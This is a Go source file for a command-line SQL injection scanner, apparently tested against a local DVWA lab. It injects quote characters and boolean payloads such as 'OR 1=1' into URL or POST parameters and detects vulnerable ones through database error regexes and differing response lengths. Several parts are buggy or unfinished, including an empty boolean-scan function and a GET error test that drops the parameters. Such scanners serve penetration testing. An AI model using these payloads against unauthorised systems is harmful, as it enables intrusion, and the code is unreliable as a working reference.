package main

import (
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

type Webscan struct {
	DBMS_ERRORS          map[string][]string
	PREFIXES             []string
	SUFFIXES             []string
	TAMPER_SQL_CHAR_POOL []string // for make error sql
	Boolean_test         []string
	Search_test          []string
}

type Response struct {
	Body          string
	StatusCode    int
	ContentLength int
}

var cookie = flag.String("c", "", "-c cookie")
var target = flag.String("t", "", "-t url")
var postdata = flag.String("p", "", "-p postdata")
var help = flag.Bool("h", false, "-h print help")

func main() {
	flag.Parse()
	if *help {
		fmt.Printf("-C cookie\n-t url\n-p postdata\n")
		return
	}
	//initial
	webscan := new(Webscan)
	webscan.Initial()
	if *target == "" {
		fmt.Println("no target")
		os.Exit(1)
	}
	if *postdata == "" {
		webscan.Scan(*target, "")
		// webscan.Scan("http://127.0.0.1:8088/DVWA/vulnerabilities/sqli/", "id=123&Submit=Submit#")
	} else {
		webscan.Scan(*target, *postdata)
	}
}

func (webscan *Webscan) Initial() {
	webscan.DBMS_ERRORS = map[string][]string{
		"MySQL":               {`SQL.*syntax`, `Warning.*mysql_.*`, `valid.*MySQL.*result`, `MySqlClient\.`},
		"PostgreSQL":          {`PostgreSQL.*ERRO`, `Warning.*\Wpg_.*`, `valid.*PostgreSQL.*result`, `Npgsql\.`},
		"Microsoft SQL Serve": {`Driver.*SQL[\-\_\ ]*Serve`, `OLE DB.* SQL Serve`, `(\W|\A)SQL Server.*Drive`, `Warning.*mssql_.*`, `(\W|\A)SQL Server.*[0-9a-fA-F]{8}`, `(?s)Exception.*\WSystem\.Data\.SqlClient\.`, `(?s)Exception.*\WRoadhouse\.Cms\.`},
		"Microsoft Access":    {`Microsoft.*Access.*Drive`, `JET.*Database.*Engine`, `Access.*Database.*Engine`},
		"Oracle":              {`\bORA-[0-9][0-9][0-9][0-9]`, `Oracle.*erro`, `Oracle.*Drive`, `Warning.*\Woci_.*`, `Warning.*\Wora_.*`},
		"IBM DB2":             {`CLI.*Driver.*DB2`, `DB2.*SQL.*erro`, `\bdb2_\w+\(`},
		"SQLite":              {`SQLite/JDBCDrive`, `SQLite.Exception`, `System.Data.SQLite.SQLiteException`, `Warning.*sqlite_.*`, `Warning.*SQLite3::`, `[SQLITE_ERROR]`},
		"Sybase":              {`(?i)Warning.*sybase.*`, `Sybase.*message`, `Sybase.*Server.*message.*`},
	}
	webscan.PREFIXES = []string{"", ")", "'", "')", "\"", "\")"}
	webscan.SUFFIXES = []string{"/**/", "--+1", "#", "/*"}
	webscan.TAMPER_SQL_CHAR_POOL = []string{"'", "\""}
	webscan.Boolean_test = []string{"/**/OR/**/1=1", "/**/AND/**/1=2"}
	webscan.Search_test = []string{"' AND 1=1 AND '%'='%", "' AND 1=2 AND '%'='%"}
}

func (webscan *Webscan) Receive_Get(url string) (*Response, error) {
	Resp := new(Response)
	// resp, err := http.Get(url)

	client := &http.Client{}
	req, err := http.NewRequest("Get", url, nil)

	if err != nil {
		// return "", 0, 0, err
		return nil, err
	}
	req.Header.Set("Cookie", *cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36")
	resp, err := client.Do(req)
	defer resp.Body.Close()
	var b []byte
	if b, err = ioutil.ReadAll(resp.Body); err != nil {
		// fmt.Println(err)
		return nil, err
	}
	Resp.ContentLength = len(b)
	Resp.Body = string(b)
	re := regexp.MustCompile(`<script.+?</script>|<style.+?</style>|<!--.+?-->|\s+|<[^>]+?>`)
	Resp.Body = re.ReplaceAllString(Resp.Body, "") //去除检测过程不必要的元素
	Resp.StatusCode = resp.StatusCode
	// Resp.ContentLength = resp.ContentLength
	// return body, statuscode, resplenth, nil
	return Resp, nil
}

func (webscan *Webscan) Receive_Post(url string, data string) (*Response, error) {
	Resp := new(Response)
	// resp, err := http.Post(url, "application/x-www-form-urlencoded",
	// 	strings.NewReader(data))

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, strings.NewReader(data))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", *cookie)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36")
	resp, err := client.Do(req)
	defer resp.Body.Close()
	var b []byte
	if b, err = ioutil.ReadAll(resp.Body); err != nil {
		// fmt.Println(err)
		return nil, err
	}
	Resp.ContentLength = len(b)
	Resp.Body = string(b)
	re := regexp.MustCompile(`<script.+?</script>|<style.+?</style>|<!--.+?-->|\s+|<[^>]+?>`)
	Resp.Body = re.ReplaceAllString(Resp.Body, "") //去除检测过程不必要的元素
	Resp.StatusCode = resp.StatusCode
	// Resp.ContentLength = resp.ContentLength
	// return body, statuscode, resplenth, nil
	return Resp, nil
}

// func (webscan *Webscan) Make() map[string][]string {
// 	var payload_template = make(map[string][]string)
// 	// payload_template["error"] = make([]string)
// 	for _, errbase := range webscan.TAMPER_SQL_CHAR_POOL {
// 		payload_template["error"] = append(payload_template["error"], fmt.Sprintf("%%s%s", errbase))
// 	}
// 	for _, boolbase := range webscan.Boolean_test {
// 		for _, pre := range webscan.PREFIXES {
// 			for _, suf := range webscan.SUFFIXES {
// 				payload_template["bool"] = append(payload_template["bool"], fmt.Sprintf("%s%%s%s%s", pre, boolbase, suf))
// 			}
// 		}
// 	}

// 	for _, search := range webscan.Search_test {
// 		for _, pre := range webscan.PREFIXES {
// 			for _, suf := range webscan.SUFFIXES {
// 				payload_template["bool"] = append(payload_template["bool"], fmt.Sprintf("%s %%s%s%s", pre, search, suf))
// 			}
// 		}
// 	}

// 	return payload_template
// }

type NotFound struct {
	url string
}

func (nd NotFound) Error() string {
	return fmt.Sprintf("%s Not Found", nd.url)
}

//http://xxx.xxx.xxx/.../.../a?a=1   =>  http://xxx.xxx.xxx/.../.../a  a=1
func split_url(url string) (path string, param string, err error) {
	Inx := strings.Index(url, "?")
	if Inx == -1 {
		// return "","",errors.New(fmt.Sprintf("%s Not Found",url))
		return "", "", NotFound{url: url}
	}
	return url[:Inx], url[Inx+1:], nil

}

func split_data(data string) (arr map[int][]string, err error) {
	arr = make(map[int][]string)
	arr1 := strings.Split(data, "&")
	if len(arr1) == 1 {
		return nil, errors.New(fmt.Sprintf("%s Not Found &", data))
	}
	for i, a := range arr1 {
		arr2 := strings.Split(a, "=")
		if len(arr2) == 1 {
			return nil, errors.New(fmt.Sprintf("%s Not Found =", a))
		}
		// fmt.Println(arr2, i)
		arr[i] = []string{arr2[0], arr2[1]}
	}
	return arr, nil
}

//data = "a=1&b=2"
func (webscan *Webscan) Scan(url string, data string) {
	// retval := false

	//Get Request
	//url = http://xxx.xxx.xxx/.../.../...?a=1
	//url = http://xxx.xxx.xxx/.../.../...?a=1&b=1
	if data == "" { //Get Request

		//....scan for error inj
		webscan.Scan_Err(url, "", "")

		//...scan for bool inj

	} else { //Post Request
		webscan.Scan_Err(url, data, "P")
	}

}

func (webscan *Webscan) Scan_Err(URL string, data string, method string) {
	if method == "" && data == "" { //Get
		if baseURL, data1, err := split_url(URL); err != nil {
			fmt.Println(err)
			return //no param
		} else {
			data = data1
			URL = baseURL
		}

	} else { //POST

	}

	re := regexp.MustCompile(`=[^&#]+`)
	Resp := new(Response)
	var err error
	for _, param := range re.FindAllString(data, -1) {
		//err Sqlinject test
		for _, errpayload := range webscan.TAMPER_SQL_CHAR_POOL {
			attackdata := fmt.Sprintf("%s%s", param, errpayload)
			attackdata = strings.Replace(data, param, attackdata, -1)
			// fmt.Println(attackdata)
			if method == "" { //Get
				Resp, err = webscan.Receive_Get(fmt.Sprintf("%s?%s", URL, url.PathEscape(errpayload)))
				if err != nil {
					fmt.Println(err)
					return
				}
			} else {
				Resp, err = webscan.Receive_Post(URL, attackdata)
				if err != nil {
					fmt.Println(err)
					return
				}
			}

			for key, values := range webscan.DBMS_ERRORS {
				// fmt.Println(key)
				for _, v := range values {
					reErr := regexp.MustCompile(v)
					// fmt.Println(v)
					if reErr.FindString(Resp.Body) != "" {
						fmt.Printf("%s find Error Sqlinject: %s %s\n", fmt.Sprintf("%s?%s", URL, attackdata), key, v)
						return
					}
				}
			}
		}

		//bool Sqlinject test
		for _, pre := range webscan.PREFIXES {
			for _, suf := range webscan.SUFFIXES {
				var contentlength1 int
				var contentlength2 int //两次请求，比较结果
				var attackdata string
				for i, boolpayload := range webscan.Boolean_test {
					// fmt.Println(strings.Replace(param, "=", "", -1))
					attackdata = fmt.Sprintf("=%s%s%s%s", strings.Replace(param, "=", "", -1), pre, boolpayload, suf)
					// fmt.Println(attackdata)
					attackdata = strings.Replace(data, param, attackdata, -1)
					// fmt.Println(attackdata)
					if method == "" { //Get
						// fmt.Printf("%s?%s\n", URL, url.PathEscape(attackdata))
						Resp, err = webscan.Receive_Get(fmt.Sprintf("%s?%s", URL, url.PathEscape(attackdata)))
						if err != nil {
							fmt.Println(err)
							return
						}
						if i == 0 { //第一次请求
							contentlength1 = Resp.ContentLength
						} else { //第二次请求
							contentlength2 = Resp.ContentLength
						}
					} else {
						Resp, err = webscan.Receive_Post(URL, attackdata)
						if err != nil {
							fmt.Println(err)
							return
						}
						if i == 0 { //第一次请求
							contentlength1 = Resp.ContentLength
						} else { //第二次请求
							contentlength2 = Resp.ContentLength
						}

					}
				}
				if contentlength1 != contentlength2 {
					fmt.Printf("%s find Bool Sqlinject: %s", fmt.Sprintf("%s?%s", URL, data), attackdata)
					return
				} else {
					// fmt.Println(contentlength1, " ", contentlength2)
				}
			}
		}

		//other test...
	}

}

func (webscan *Webscan) Scan_Bool(URL string, data string, method string) {

}
